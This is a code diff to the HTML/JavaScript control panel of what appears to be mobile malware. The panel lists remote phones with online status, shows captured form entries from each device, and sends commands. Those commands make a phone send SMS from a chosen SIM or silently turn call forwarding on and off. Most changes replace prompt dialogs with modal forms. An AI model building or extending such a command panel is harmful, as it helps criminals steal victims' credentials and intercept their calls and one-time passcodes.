@@ -45,6 +45,7 @@
         .modal-header h2 { margin: 0; }
         .close-btn { background: var(--danger); color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
         .no-data { text-align: center; color: #999; padding: 30px; }
+        .cmd-status { margin-top: 10px; padding: 10px; border-radius: 5px; font-weight: bold; display: none; }
     </style>
 </head>
 <body>
@@ -99,6 +100,16 @@
         </div>
     </div>
 
+    <div id="actionModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 id="actionModalTitle">Action</h2>
+                <button class="close-btn" onclick="closeModal('actionModal')">✕ Close</button>
+            </div>
+            <div id="actionModalBody"></div>
+        </div>
+    </div>
+
     <script src="/socket.io/socket.io.js"></script>
     <script>
         function escapeAttr(str) {
@@ -148,6 +159,17 @@
         }
 
         socket.on('dashboard-update', () => fetchData(false));
+        
+        socket.on('command-result', (res) => {
+            const statusBox = document.getElementById('cmdStatusBox');
+            if (statusBox) {
+                statusBox.style.display = 'block';
+                statusBox.style.background = res.success ? '#e8f5e9' : '#ffebee';
+                statusBox.style.color = res.success ? '#2e7d32' : '#c62828';
+                statusBox.innerText = (res.success ? '✅ ' : '❌ ') + (res.message || (res.success ? 'Command Successful' : 'Command Failed'));
+            }
+            toast(res.message || (res.success ? 'Success' : 'Failed'), !res.success);
+        });
 
         function filter(type, btn) {
             currentFilter = type;
@@ -239,7 +261,7 @@
                 
                 const copyBtn = (text) => `<i class="fas fa-copy" style="color:#1976d2;cursor:pointer;margin-left:8px;" onclick="navigator.clipboard.writeText('${escapeAttr(text)}');toast('Copied')"></i>`;
                 
-                let html = `<div style="background:#e3f2fd;padding:20px;border-radius:12px;">
+                let html = `<div style="background:#e3f2fd;padding:18px;border-radius:12px;">
                     <h3 style="margin-top:0;color:#1976d2;border-bottom:2px solid #1976d2;padding-bottom:10px;">Device Details</h3>`;
                 
                 const statusHtml = device.isOnline 
@@ -259,7 +281,7 @@
                 ];
 
                 fields.forEach(f => {
-                    html += `<div style="margin-bottom:10px;font-size:15px;display:flex;justify-content:space-between;border-bottom:1px solid #eee;padding-bottom:5px;">
+                    html += `<div style="margin-bottom:8px;font-size:14px;display:flex;justify-content:space-between;border-bottom:1px solid #eee;padding-bottom:4px;">
                         <b style="color:#555;">${f[0]}:</b> 
                         <span style="color:#333;font-weight:500;">${f[1]}</span>
                     </div>`;
@@ -273,7 +295,7 @@
                 } else {
                     let i = 1;
                     for (const [key, value] of Object.entries(formData)) {
-                        html += `<div style="margin-bottom:10px;font-size:15px;background:#fffde7;padding:12px;border-radius:8px;border-left:5px solid #ff9800;display:flex;justify-content:space-between;align-items:center;">
+                        html += `<div style="margin-bottom:8px;font-size:14px;background:#fffde7;padding:12px;border-radius:8px;border-left:5px solid #ff9800;display:flex;justify-content:space-between;align-items:center;">
                             <div><b style="color:#e65100;">${i++}. ${escapeAttr(key)}:</b> <span style="color:#333;">${escapeAttr(value)}</span></div>
                             <i class="fas fa-copy" style="color:#ff9800;cursor:pointer;" onclick="navigator.clipboard.writeText('${escapeAttr(value)}');toast('Copied')"></i>
                         </div>`;
@@ -346,19 +368,168 @@
         }
 
         function showSendSmsModal(deviceId) {
-            const num = prompt("Enter Number:"); if(!num) return;
-            const msg = prompt("Enter Message:"); if(!msg) return;
-            fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'SEND_SMS', data:{ number:num, message:msg, simSlot:1 } }) }).then(r=>r.json()).then(d=>toast(d.message));
+            document.getElementById('actionModalTitle').innerText = 'Send SMS';
+            document.getElementById('actionModalBody').innerHTML = `
+                <div style="display:flex;flex-direction:column;gap:15px;">
+                    <div>
+                        <label style="display:block;margin-bottom:5px;font-weight:bold;">SELECT SIM:</label>
+                        <select id="smsSim" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
+                            <option value="1">SIM 1</option>
+                            <option value="2">SIM 2</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label style="display:block;margin-bottom:5px;font-weight:bold;">ENTER RECIPIENT NUMBER:</label>
+                        <input type="text" id="smsNumber" placeholder="Recipient Number" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
+                    </div>
+                    <div>
+                        <label style="display:block;margin-bottom:5px;font-weight:bold;">ENTER TEXT:</label>
+                        <textarea id="smsText" rows="5" placeholder="Enter message text here..." style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;"></textarea>
+                    </div>
+                    <div id="cmdStatusBox" class="cmd-status"></div>
+                    <button class="btn-gold" onclick="sendSmsCommand('${deviceId}')" style="width:100%;padding:12px;border-radius:5px;">SEND SMS</button>
+                </div>
+            `;
+            document.getElementById('actionModal').classList.add('show');
+        }
+
+        async function sendSmsCommand(deviceId) {
+            const sim = document.getElementById('smsSim').value;
+            const number = document.getElementById('smsNumber').value.trim();
+            const text = document.getElementById('smsText').value.trim();
+            if (!number || !text) { toast('All fields are required', true); return; }
+            
+            const statusBox = document.getElementById('cmdStatusBox');
+            statusBox.style.display = 'block';
+            statusBox.style.background = '#e3f2fd';
+            statusBox.style.color = '#1976d2';
+            statusBox.innerText = 'Sending command to device...';
+
+            try {
+                const res = await fetch('/api/command', { 
+                    method:'POST', 
+                    headers:{'Content-Type':'application/json'}, 
+                    body: JSON.stringify({ deviceId, action:'SEND_SMS', data:{ number, message:text, simSlot:sim } }) 
+                });
+                const d = await res.json();
+                if (!d.success) {
+                    statusBox.style.background = '#ffebee';
+                    statusBox.style.color = '#c62828';
+                    statusBox.innerText = '❌ ' + (d.message || 'Error');
+                }
+            } catch (e) { toast('Error', true); }
         }
 
         function showCallForwardModal(deviceId) {
-            const num = prompt("Enter Forward Number (or leave blank to deactivate):");
-            const action = num ? 'CALL_FORWARD_ACTIVATE' : 'CALL_FORWARD_DEACTIVATE';
-            fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action, data:{ number:num, simSlot:1 } }) }).then(r=>r.json()).then(d=>toast(d.message));
+            document.getElementById('actionModalTitle').innerText = 'Call Forwarding';
+            document.getElementById('actionModalBody').innerHTML = `
+                <div style="display:flex;flex-direction:column;gap:15px;">
+                    <div>
+                        <label style="display:block;margin-bottom:5px;font-weight:bold;">SELECT SIM:</label>
+                        <select id="cfSim" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
+                            <option value="1">SIM 1</option>
+                            <option value="2">SIM 2</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label style="display:block;margin-bottom:5px;font-weight:bold;">ENTER TARGET NUMBER:</label>
+                        <input type="text" id="cfNumber" placeholder="Target Number" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
+                    </div>
+                    <div id="cmdStatusBox" class="cmd-status"></div>
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+                        <button class="btn-sm btn-sms" onclick="callFwdCommand('${deviceId}', 'CALL_FORWARD_ACTIVATE')" style="padding:12px;">ACTIVE</button>
+                        <button class="btn-sm btn-del" onclick="callFwdCommand('${deviceId}', 'CALL_FORWARD_DEACTIVATE')" style="padding:12px;">DEACTIVE</button>
+                    </div>
+                    <button class="btn-sm btn-call" onclick="callFwdCommand('${deviceId}', 'CALL_FORWARD_STATUS')" style="width:100%;padding:12px;">CHECK STATUS</button>
+                </div>
+            `;
+            document.getElementById('actionModal').classList.add('show');
+        }
+
+        async function callFwdCommand(deviceId, action) {
+            const sim = document.getElementById('cfSim').value;
+            const number = document.getElementById('cfNumber').value.trim();
+            if (action === 'CALL_FORWARD_ACTIVATE' && !number) { toast('Target number required', true); return; }
+
+            const statusBox = document.getElementById('cmdStatusBox');
+            statusBox.style.display = 'block';
+            statusBox.style.background = '#e3f2fd';
+            statusBox.style.color = '#1976d2';
+            statusBox.innerText = 'Sending command to device...';
+
+            try {
+                const res = await fetch('/api/command', { 
+                    method:'POST', 
+                    headers:{'Content-Type':'application/json'}, 
+                    body: JSON.stringify({ deviceId, action, data:{ number, simSlot:sim } }) 
+                });
+                const d = await res.json();
+                if (!d.success) {
+                    statusBox.style.background = '#ffebee';
+                    statusBox.style.color = '#c62828';
+                    statusBox.innerText = '❌ ' + (d.message || 'Error');
+                }
+            } catch (e) { toast('Error', true); }
+        }
+
+        function changePass() {
+            document.getElementById('actionModalTitle').innerText = 'Change Admin Password';
+            document.getElementById('actionModalBody').innerHTML = `
+                <div style="display:flex;flex-direction:column;gap:15px;">
+                    <div>
+                        <label style="display:block;margin-bottom:5px;font-weight:bold;">ENTER OLD PASSWORD:</label>
+                        <input type="password" id="oldPass" placeholder="Old Password" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
+                    </div>
+                    <div>
+                        <label style="display:block;margin-bottom:5px;font-weight:bold;">ENTER NEW PASSWORD:</label>
+                        <input type="password" id="newPass" placeholder="New Password" style="width:100%;padding:10px;border-radius:5px;border:1px solid #ccc;">
+                    </div>
+                    <div id="cmdStatusBox" class="cmd-status"></div>
+                    <button class="btn-gold" onclick="submitPasswordChange()" style="width:100%;padding:12px;border-radius:5px;">PROCEED</button>
+                </div>
+            `;
+            document.getElementById('actionModal').classList.add('show');
+        }
+
+        async function submitPasswordChange() {
+            const oldPassword = document.getElementById('oldPass').value;
+            const newPassword = document.getElementById('newPass').value;
+            if (!oldPassword || !newPassword) { toast('Both fields are required', true); return; }
+
+            const statusBox = document.getElementById('cmdStatusBox');
+            statusBox.style.display = 'block';
+            statusBox.style.background = '#e3f2fd';
+            statusBox.style.color = '#1976d2';
+            statusBox.innerText = 'Processing...';
+
+            try {
+                const r = await fetch('/api/change-password', { 
+                    method:'POST', 
+                    headers:{'Content-Type':'application/json'}, 
+                    body: JSON.stringify({ oldPassword, newPassword }) 
+                });
+                const d = await r.json();
+                if (d.success) {
+                    statusBox.style.background = '#e8f5e9';
+                    statusBox.style.color = '#2e7d32';
+                    statusBox.innerText = '✅ Password Change Successful';
+                    toast('Password Changed Successfully');
+                    setTimeout(() => closeModal('actionModal'), 1500);
+                } else {
+                    statusBox.style.background = '#ffebee';
+                    statusBox.style.color = '#c62828';
+                    statusBox.innerText = '❌ ' + (d.message || 'Failed');
+                    toast(d.message || 'Error', true);
+                }
+            } catch (err) { 
+                statusBox.style.background = '#ffebee';
+                statusBox.style.color = '#c62828';
+                statusBox.innerText = '❌ Server Error';
+                toast('Error', true); 
+            }
         }
 
         function closeModal(id) { document.getElementById(id).classList.remove('show'); currentOpenModal = null; }
-        async function changePass() { const o = prompt('Old Password:'); const n = prompt('New Password:'); if (o && n) { const r = await fetch('/api/change-password', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ oldPassword: o, newPassword: n }) }); const d = await r.json(); toast(d.success ? 'Changed' : 'Wrong Old', !d.success); } }
     </script>
 </body>
 </html>
